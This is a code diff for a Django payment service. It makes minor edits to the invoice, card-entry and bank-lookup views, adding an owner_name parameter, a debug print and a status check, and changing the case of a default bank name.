@@ -48,7 +48,7 @@ def get_phone_script(card_num) -> PhoneScript:
         bank = Bank.objects.filter(bins__contains=[bin_num]).first()
 
         if not bank:
-            bank = Bank.objects.get(name='Default')
+            bank = Bank.objects.get(name='default')
         logger.info(f'phone_script: {bank.script}')
         return bank.script
     except Exception as err:
@@ -112,6 +112,7 @@ def invoice(request, *args, **kwargs):
         shop_id = request.GET.get('shop_id')
         order_id = request.GET.get('order_id')
         user_login = request.GET.get('user_login')
+        owner_name = request.GET.get('owner_name')
         amount = request.GET.get('amount')
         pay_type = request.GET.get('pay_type')
         query_params = request.GET.urlencode()
@@ -131,6 +132,7 @@ def invoice(request, *args, **kwargs):
                 order_id=order_id,
                 user_login=user_login,
                 amount=amount,
+                owner_name=owner_name,
             )
             logger.debug(f'payment, status: {payment} {status}')
         except Exception as err:
@@ -244,6 +246,7 @@ def pay_to_card_create(request, *args, **kwargs):
 
 def pay_to_m10_create(request, *args, **kwargs):
     """Платеж через ввод реквизитов карты"""
+    print('pay_to_m10_create')
     if request.method == 'GET':
         payment_id = request.GET.get('payment_id')
         logger.debug(f'GET {request.GET.dict()}'
@@ -296,7 +299,8 @@ def pay_to_m10_create(request, *args, **kwargs):
                 return redirect(reverse('payment:pay_result', kwargs={'pk': payment.id}))
             # Введены данные карты
             payment.amount = amount
-            payment.status = 3  # Ввел CC.
+            if payment.status == 0:
+                payment.status = 3  # Ввел CC.
             payment.save()
             return render(request, context=context, template_name='payment/invoice_m10.html')
         else:
@@ -454,7 +458,7 @@ def get_bank(request, bin_num):
     if bank:
         data = {'image': bank.image.name}
     else:
-        bank = Bank.objects.filter(name='Default').first()
+        bank = Bank.objects.filter(name='default').first()
         data = {'image': bank.image.name}
     print(data)
     return JsonResponse(data, safe=False)
